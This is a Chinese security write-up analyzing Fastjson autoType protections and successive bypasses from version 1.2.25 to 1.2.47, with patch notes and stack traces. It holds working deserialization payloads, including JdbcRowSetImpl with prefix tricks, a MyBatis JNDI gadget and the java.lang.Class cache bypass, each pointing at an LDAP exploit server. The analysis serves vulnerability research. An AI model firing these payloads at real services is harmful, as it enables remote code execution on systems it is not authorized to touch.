####  2、代码中设置
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
下面来看代码，这里使用了IDEA中的jar包对比功能
可以看到`DefaultJSONParser`发送了变动，在这里多了一个`checkAutoType`方法去做校验。
跟进方法查看
前面会进行白名单的校验，如果匹配中的话调用loadClass加载，返回一个Class对象。 这里默认白名单的列表为空。
后面这则是会恶意类的黑名单进行匹配，如果加载类的前面包含黑名单所定义的字符则抛出异常。
###  1.2.25-1.2.41 绕过
    package com.nice0e3;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class POC {
        public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            String PoC = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true}";
            JSON.parse(PoC);
        }
    }
先来调试不开启的情况，前面依旧就会遍历黑名单对class进行赋值，但最后这个会去检测如果未开启，则直接抛异常，开启则会去返回。
将注释打开后，则直接返回class
命令执行成功。但是可以看到前面的class是`Lcom.sun.rowset.JdbcRowSetImpl`为什么也会触发命令执行？
原因在于`com.alibaba.fastjson.parser#TypeUtils.loadClass(typeName,
this.defaultClassLoader);`方法中，可跟进查看。
这里解析到内容如果为`L`开头，`;`结尾的话就会将这2个字符清空，前面其实还有一个`[`。
###  1.2.42 修复方式
修复改动：明文黑名单改为HASH值,`checkcheckAutoType`方法添加`L`和`;`字符过滤。
加密方法位于`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`可将进行碰撞获取值。
###  1.2.42绕过方式
    package com.nice0e3;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class POC {
        public static void main(String[] args) {
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            String PoC = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true}";
            JSON.parse(PoC);
        }
    }
在`com.alibaba.fastjson.parser#checkcheckAutoType`中将`L`和`;`进行清空。这里是利用了双写的方式，前面的规则将第一组`L`和`;`，进行清空，而在`TypeUtils.loadclass`中将第二组内容清空。
###  1.2.43 修复方式
在1.2.43版本中对了LL开头的绕过进行了封堵
    //hash计算基础参数            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            //L开头，；结尾            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {                //LL开头                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {                                      throw new JSONException("autoType is not support. " + typeName);                }                className = className.substring(1, className.length() - 1);            }
再次执行poc代码可以看到报错了。
    Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. LLcom.sun.rowset.JdbcRowSetImpl;;    at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:914)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:311)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1338)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1304)    at com.alibaba.fastjson.JSON.parse(JSON.java:152)    at com.alibaba.fastjson.JSON.parse(JSON.java:162)    at com.alibaba.fastjson.JSON.parse(JSON.java:131)    at com.nice0e3.POC.main(POC.java:12)
###  1.2.43 绕过方式
前面可以看到`[`也进行了清空，可以从该地方进行入手。
    public class POC {    public static void main(String[] args) {        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[, \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true}";        JSON.parse(PoC);    }}
执行报错了，报错信息如下：
    Exception in thread "main" com.alibaba.fastjson.JSONException: syntax error, expect {, actual string, pos 44, fastjson-version 1.2.43    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1261)    at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl.deserialze(Unknown Source)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:729)    at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:183)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:373)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1338)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1304)    at com.alibaba.fastjson.JSON.parse(JSON.java:152)    at com.alibaba.fastjson.JSON.parse(JSON.java:162)    at com.alibaba.fastjson.JSON.parse(JSON.java:131)    at com.nice0e3.POC.main(POC.java:12)
提示缺少了一个`{`
    public class POC {    public static void main(String[] args) {        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true}";        JSON.parse(PoC);    }}
###  1.2.44 修复方式
将`[`进行限制，具体实现可自行查看。
再次执行前面的poc代码可以看到报错了。
###  1.2.45绕过方式
利用条件需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。
    public class POC {    public static void main(String[] args) {        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:1389/Exploit\"}}";        JSON.parse(PoC);    }}
下面来分析一下使用这个payload为什么能绕过。其实是借助了`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`进行绕过，`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`并不在黑名单中。
这里是对反序列化后的对象是`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`
传入`properties`参数，则会去自动调用`setProperties`
而在1.2.46无法执行成功，应该是对该类拉入了黑名单中。
## 1.2.25-1.2.47通杀
为什么说这里标注为通杀呢，其实这里和前面的绕过方式不太一样，这里是可以直接绕过`AutoTypeSupport`，即便关闭`AutoTypeSupport`也能直接执行成功。
先来看payload
    public class POC {    public static void main(String[] args) {              String PoC = "{\n" +                "    \"a\":{\n" +                "        \"@type\":\"java.lang.Class\",\n" +                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +                "    },\n" +                "    \"b\":{\n" +                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +                "        \"dataSourceName\":\"ldap://localhost:1389/badNameClass\",\n" +                "        \"autoCommit\":true\n" +                "    }\n" +                "}";        JSON.parse(PoC);    }}
可以看到payload和前面的payload构造不太一样，这里来分析一下。
这里未开启`AutoTypeSupport`不会走到下面的黑白名单判断。
fastjson会使用 `checkAutoType` 方法来检测`[@type](https://github.com/type
"@type")`中携带的类，但这次我们传入的是一个`java.lang.class`
来看到`com.alibaba.fastjson.parser.DefaultJSONParser.class#parseObject`方法中
跟进`deserialze`方法查看，这里的`deserialze`是`MiscCodec#deserialze`
上面代码会从`objVal = parser.parse();`获取内容为`com.sun.rowset.JdbcRowSetImpl`。来看到下面
    if (clazz == Class.class) {    return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());}
这里使用了`TypeUtils.loadClass`函数加载了`strVal`，也就是JdbcRowSetlmpl，跟进发现会将其缓存在map中。
这里的true参数代表开启缓存，如果开启将恶意类存储到mapping中
断点来到`com.alibaba.fastjson.parser.DefaultJSONParser#checkAutoType`
因为前面将`com.sun.rowset.JdbcRowSetImpl`所以这里能获取到`com.sun.rowset.JdbcRowSetImpl`该判断不为true，从而绕过黑名单。
而后续则是和前面的一样，通过`dataSourceName`触发对于的set方法将`dataSourceName`变量进行设置，而后通过`autoCommit`,触发`setAutoCommit`触发`lookup()`达到命令执行。
###  参考文章
    https://xz.aliyun.com/t/9052
    https://xz.aliyun.com/t/7027
    https://kingx.me/Exploit-Java-Deserialization-with-RMI.html
    http://wjlshare.com/archives/1526
## 0x03 结尾
其实后面还有几个绕过的方式后面再去做分析，除此外还有一些BCEL来解决fastjson不出网回显等方面都值得去思考和研究。如有不对望师傅们指出。